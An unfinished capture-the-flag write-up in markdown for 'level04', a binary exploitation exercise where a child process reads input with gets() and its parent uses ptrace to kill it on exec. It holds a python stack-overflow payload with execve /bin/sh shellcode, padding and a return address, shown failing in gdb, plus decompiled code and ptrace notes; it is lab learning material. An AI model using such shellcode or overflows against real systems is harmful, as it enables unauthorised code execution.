# level 4 <vulnerability name/type>

## Overview
<explanation about: the type of binary in high level and the type of vulnerability>

## Steps (copiable for the correction)

### gets
*there is vulnerability with `gets`*

let's check address of each variables.

address of argument of gets: `%esp+0x20` = `0xffffd630`\
address of return address: `%ebp+0x4` = `0xffffd6cc`\
offset = 156 bytes

```
python -c '''
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
padding = "x"*(156-len(shellcode))
address = "\xff\xff\xd6\x30"[::-1]
print shellcode + padding + address
''' > /tmp/04

(gdb) r <<< $(cat /tmp/04)
Starting program: /home/users/level04/level04 <<< $(cat /tmp/04)
Give me some shellcode, k
no exec() for you
[Inferior 1 (process 2007) exited normally]
```

this method is blocked by in `parent`
```
while ( v8 != 11 );
puts("no exec() for you");
kill(v9, 9);
```


### challenge
1. weird if statement. \
`if ( (v4 & 0x7F) == 0 || (v7 = v4, (char)((v4 & 0x7F) + 1) >> 1 > 0) )`\
It seems impossible to pass it... 

3. not fully understand how `ptrace` works. 

### reference links
[Playing with ptrace](https://www.linuxjournal.com/article/6100)\
[ptrace.h](https://sites.uclouvain.be/SystInfo/usr/include/sys/ptrace.h.html)\
[Exploiting Linux systems with ptrace](https://raj3shp.medium.com/exploiting-linux-systems-with-ptrace-637f13a7d9ea)\
[Intercepting and Emulating Linux System Calls with Ptrace](https://nullprogram.com/blog/2018/06/23/)

## Code
### in child
```c
prctl(1, 1);
ptrace(0, 0, 0, 0);
puts("Give me some shellcode, k");
gets(v5);
```
- `prctl(1, 1)` sets the process to receive a SIGHUP signal if its parent process dies.
- `ptrace(PTRACE_TRACEME, 0, 0, 0)` declares that the current process should be traced by its parent, often used in debugging scenarios.

### in parent
```c
do
{
  wait(&v4);
  v6 = v4;
  if ( (v6 & 0x7F) == 0 || (v7 = v4, (char)((v4 & 0x7F) + 1) >> 1 > 0) )
  {
    puts("child is exiting...");
    return 0;
  }
  v8 = ptrace(3, v9, 44, 0);
}
while ( v8 != 11 );
puts("no exec() for you");
kill(v9, 9);
```



```
(gdb) set follow-fork-mode child
(gdb) set follow-fork-mode parent
```


## Payload (Most important command to obtain the flag)

## Flag